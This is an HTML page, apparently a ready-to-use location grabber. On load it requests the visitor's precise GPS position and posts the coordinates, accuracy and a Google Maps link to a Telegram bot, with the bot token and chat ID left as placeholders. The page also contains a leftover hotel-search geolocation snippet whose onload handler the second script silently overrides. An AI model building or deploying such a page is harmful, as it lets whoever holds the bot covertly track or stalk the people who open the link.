<!DOCTYPE html>
<html>

<head>
  <title>GPS to Telegramm</title>
  <script>
    window.onload = () => {
    requestLocation();
};

function requestLocation() {

    if (!navigator.geolocation) {
        console.log("Geolocation is not supported.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            console.log("Latitude:", latitude);
            console.log("Longitude:", longitude);

            // Call your hotel API here
            // getNearbyHotels(latitude, longitude);
        },

        (error) => {
            switch (error.code) {

                case error.PERMISSION_DENIED:
                    console.log("User denied location permission.");
                    // Show "Search by City" UI here
                    break;

                case error.POSITION_UNAVAILABLE:
                    console.log("Location unavailable.");
                    break;

                case error.TIMEOUT:
                    console.log("Location request timed out.");
                    break;

                default:
                    console.log("Unknown error.");
            }
        },

        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}
  </script>
  <script>
    const botToken = "Bot token"; // <-- Replace with your Bot token
    const chatId = "Chat ID"; // <-- Replace with your Chat ID
  
    

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const message = `📍 New Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nhttps://maps.google.com/?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
        .then(() => {
          document.body.innerHTML = "<h2 style='color:green;'>📬 Location sent to Telegram!</h2>";
        })
        .catch(err => {
          console.error(err);
          document.body.innerHTML = "<h2 style='color:red;'>❌ Failed to send to Telegram</h2>";
        });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, () => {
          document.body.innerHTML = "<h2 style='color:red;'>❌ Permission Denied</h2>";
        });
      } else {
        document.body.innerHTML = "<h2>❌ Geolocation not supported</h2>";
      }
    }

    window.onload = getLocation;
  </script>
</head>

<body>
  <h2>📡 Tracking Location...</h2>
</body>

</html>
